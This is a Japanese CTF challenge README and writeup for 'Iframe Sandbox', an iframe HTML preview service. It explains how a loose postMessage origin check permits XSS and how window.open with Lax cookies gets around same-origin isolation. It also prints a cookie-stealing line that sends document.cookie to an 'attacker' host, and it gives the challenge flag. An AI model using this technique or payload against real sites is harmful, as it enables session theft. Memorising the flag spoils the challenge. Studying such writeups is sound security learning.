# Iframe Sandbox

[English version is here](./README.md)

## 説明

iframe を使った HTML プレビューサービスを作りました。「sandbox」 属性が XSS を防ぐのに十分だといいのですが。

### 初心者向けヒント：Webページをホストする方法
- Web ページは好きな方法でホストできますが、[RequestRepo](https://requestrepo.com/) を利用することを強くおすすめします。

## Writeup

### 概要

`sandbox.html` はiframe内でレンダリングされることを想定しています。親ページから `render-html` メッセージを受け取り、HTMLをレンダリングします。

```html
<script>
    const app = document.getElementById("app");

    window.addEventListener("message", (event) => {
        if (event.source !== window.parent || !event.origin.includes(location.hostname)) {
            return;
        }

        const data = event.data;
        if (!data || data.type !== "render-html") {
            return;
        }

        app.innerHTML = data.html;
    });
</script>
```

このチャレンジの目標は、Cookieを抽出することです。

### ステップ1：XSSの達成

`index.html` から攻撃するのはおそらく不可能です。理由は以下の通りです：
* URL経由でレンダリングされるHTMLを指定することができません。訪問するURL以外にBotを制御する方法がないため、`index.html` を使用して任意のHTMLをレンダリングさせる方法はありません。
* iframeの `sandbox` 属性により、JavaScriptの実行が禁止されています。

自分でホストしたWebページ内で `sandbox.html` をiframeでレンダリングしてみることができます。しかし、以下のチェックによってクロスオリジンでのメッセージ送信が防がれているように見えます。

```javascript
!event.origin.includes(location.hostname)
```

このチェックはかなり緩いです。`location.hostname` は `web` です。つまり、オリジンに文字列 `web` を含むWebページ内のiframeでレンダリングすれば、メッセージが受け入れられます。

この条件を満たすWebページを作成する方法はいくつかあります：
* [RequestRepo](https://requestrepo.com/) は、Webページを簡単に作成できるWebサービスです。`http://*.<subdomain>.requestrepo.com/` の下にWebページをホストできます。したがって、`http://web.<subdomain>.requestrepo.com/` の下でWebページをホストすれば、文字列 `web` が含まれることになります。
* 自分が所有するマシンや、Compute Engine、EC2などのクラウドサーバーを使用して、インターネットからアクセス可能なサーバーを作成します。そして、ワイルドカードDNSサービスである [nip.io](https://nip.io/) を使用します。例えば、WebサーバーのIPアドレスが `111.111.111.111` の場合、`web.111.111.111.111.nip.io` は `111.111.111.111` に解決され、`http://web.111.111.111.111.nip.io/` の下で `web` を含むWebページをホストできます。

### ステップ2：同一オリジンポリシー (SOP) のバイパス

ステップ1から `location='http://attacker/?'+document.cookie` を実行してみてください。確かにリクエストは送信されますが、Cookieが空であることに気づくでしょう。これはなぜでしょうか？

原因は **同一オリジンポリシー (Same-Origin Policy: SOP)** です。現代のWebブラウザは、異なるオリジンを持つWebページ間の相互作用を制限します。SOPにより、クロスオリジンのiframeをレンダリングすると、Cookieへのアクセスが防止されます。

この制限は以下の手順でバイパスできます：
* ステップ1のXSSを使用して、`window.open` 関数で `http://web:3000/` 内の任意のページを開きます。
* Cookieに `SameSite` 属性が含まれていないため、デフォルト値の `Lax` にフォールバックされています。`Lax` Cookieは、`window.open` で開かれたページであっても、トップレベルのナビゲーションでは送信されるので、開いたウィンドウでcookieを利用することができます。
* 自分のWebサイトにレンダリングしたiframeと、開かれたウィンドウが同じオリジンを持つようになります。つまり、iframeもそのCookieにアクセスできることを意味します。

RequestRepoを使用した解決策については、[solver.py](./solver.py) を参照してください。

## Flag
`Alpaca{4noth3r_sandb0x_An0ther_byp4s5}`
